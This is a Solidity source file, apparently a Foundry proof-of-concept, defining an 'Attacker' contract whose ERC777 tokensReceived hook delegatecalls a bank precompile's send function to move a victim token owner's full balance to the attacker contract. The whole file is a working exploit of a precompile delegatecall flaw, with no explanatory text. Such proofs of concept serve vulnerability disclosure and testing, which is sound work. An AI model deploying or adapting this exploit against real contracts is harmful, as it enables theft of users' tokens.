// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./IERC777.sol";
import {Test, console} from "forge-std/Test.sol";

address constant BANK_PRECOMPILE_ADDRESS = 0x0000000000000000000000000000000000001001;

IBank constant BANK_CONTRACT = IBank(BANK_PRECOMPILE_ADDRESS);

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function owner() external view returns (address);
}

interface IBank {
    function send(
        address fromAddress,
        address toAddress,
        string memory denom,
        uint256 amount
    ) external returns (bool success);

    function sendNative(
        string memory toNativeAddress
    ) external payable returns (bool success);
}


contract Attacker is IERC777Recipient {
    address victimToken;
    string denom;

    function setVictimToken(address _victimToken) public {
        victimToken = _victimToken;
    }

    function getVictimToken() public view returns (address) {
        return victimToken;
    }

    function setVictimTokenDenom(string memory _denom) public {
        denom = _denom;
    }

    function getVictimTokenDenom() public view returns (string memory) {
        return denom;
    }

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) public override {
        uint256 victimContractOwnerBal = IERC20(victimToken).balanceOf(IERC20(victimToken).owner());
        console.log("victimContractOwnerBal: ", victimContractOwnerBal);

        (bool success, ) = BANK_PRECOMPILE_ADDRESS.delegatecall(
            abi.encodeWithSignature(
                "send(address,address,string,uint256)",
                victimToken,
                address(this),
                denom,
                victimContractOwnerBal
            )
        );

        require(success, "CosmWasm execute failed");
        console.log("tokensReceived end");
    }
}
